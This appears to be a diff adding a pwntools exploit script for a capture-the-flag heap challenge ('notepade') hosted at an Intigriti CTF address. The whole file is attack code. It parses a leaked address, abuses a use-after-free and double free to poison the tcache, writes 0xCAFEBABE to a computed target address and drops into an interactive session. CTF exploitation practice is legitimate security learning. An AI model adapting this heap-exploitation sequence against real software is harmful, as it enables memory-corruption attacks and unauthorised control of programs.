@@ -1,0 +1,56 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+exe = ELF("./notepade")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux-x86-64.so.2")
+# context.log_level='debug'
+p = remote("notepad.ctf.intigriti.io", 1341)
+# p = process([exe.path])
+def gdbs():
+    context.terminal = ["foot"]
+    gdb.attach(p, gdbscript="""
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+p.recvuntil("gift: ")
+addr = int(p.recvuntil("\n"),16)
+log.info(f"{hex(addr) = }")
+def create(idx,size,data):
+    sla(">","1")
+    sla(">",str(idx))
+    sla(">",str(size))
+    sla(">",data)
+def edit(idx,data):
+    sla(">","3")
+    sla(">",str(idx))
+    sla(">",data)
+def free(idx):
+    sla(">","4")
+    sla(">",str(idx))
+# gdbs()
+key = addr +2100914
+create(0,0x30,"lmaodark")
+free(0)
+edit(0,"aaaaaaaaaaaaaaa")
+free(0)
+edit(0,p64(key))
+create(1,0x30,"aaaaaaaa")
+create(2,0x30,p64(0xCAFEBABE))
+
+
+
+
+
+
+p.interactive()
+# good luck pwning :)
+
